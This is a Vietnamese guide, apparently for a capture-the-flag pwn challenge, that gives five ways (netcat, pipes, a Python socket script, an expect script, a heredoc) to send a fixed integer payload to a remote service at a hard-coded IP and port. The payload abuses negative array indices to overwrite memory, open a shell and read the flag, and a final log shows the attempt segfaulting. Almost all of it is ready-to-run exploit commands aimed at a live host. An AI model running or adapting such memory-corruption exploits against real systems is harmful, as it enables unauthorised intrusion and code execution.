===================================================================
HƯỚNG DẪN TEST VỚI NC (NETCAT)
===================================================================

## Cách 1: Paste từng dòng thủ công

```bash
nc 34.84.25.24 58554
```

Sau đó paste từng dòng sau (mỗi lần Enter):

```
0
1852400175
1
6845231
-22
6295744
-21
0
-40
4196032
-39
0
-1
```

Sau khi paste xong, nếu exploit thành công, bạn sẽ có shell. Gõ:
```
cat flag*
ls
pwd
```

---

## Cách 2: Pipe input từ file

```bash
cat PAYLOAD.txt | grep -E '^[0-9-]+$' | nc 34.84.25.24 58554
```

Hoặc:

```bash
(cat PAYLOAD.txt | grep -E '^[0-9-]+$'; cat) | nc 34.84.25.24 58554
```

---

## Cách 3: Dùng Python one-liner

```bash
python3 -c "
import socket
s = socket.socket()
s.connect(('34.84.25.24', 58554))
s.recv(1024)
for x in [0,1852400175,1,6845231,-22,6295744,-21,0,-40,4196032,-39,0,-1]:
    s.send(f'{x}\n'.encode())
    s.recv(1024)
s.send(b'cat flag*\n')
print(s.recv(8192).decode())
"
```

---

## Cách 4: Dùng expect script (auto-interact)

Tạo file `test.exp`:
```tcl
#!/usr/bin/expect -f
spawn nc 34.84.25.24 58554
expect "index? > "
send "0\n"
expect "value? > "
send "1852400175\n"
expect "index? > "
send "1\n"
expect "value? > "
send "6845231\n"
expect "index? > "
send "-22\n"
expect "value? > "
send "6295744\n"
expect "index? > "
send "-21\n"
expect "value? > "
send "0\n"
expect "index? > "
send "-40\n"
expect "value? > "
send "4196032\n"
expect "index? > "
send "-39\n"
expect "value? > "
send "0\n"
expect "index? > "
send "-1\n"
expect "$ "
send "cat flag*\n"
expect eof
```

Chạy:
```bash
chmod +x test.exp
./test.exp
```

---

## Cách 5: Test nhanh với heredoc

```bash
nc 34.84.25.24 58554 << EOF
0
1852400175
1
6845231
-22
6295744
-21
0
-40
4196032
-39
0
-1
cat flag*
EOF
```

---

## KẾT QUẢ MẤT KHẢY (như user đã test):

```
index? > 0
1852400175
1
6845231
-22
6295744
-21
0
-40
4196032
-39
0
-1value? > index? > value? > index? > value? > index? > value? > index? > value? > index? > value? > index? > cat flag
timeout: the monitored command dumped core
Segmentation fault
```

→ **Exploit bị SEGFAULT** trên remote server!

===================================================================
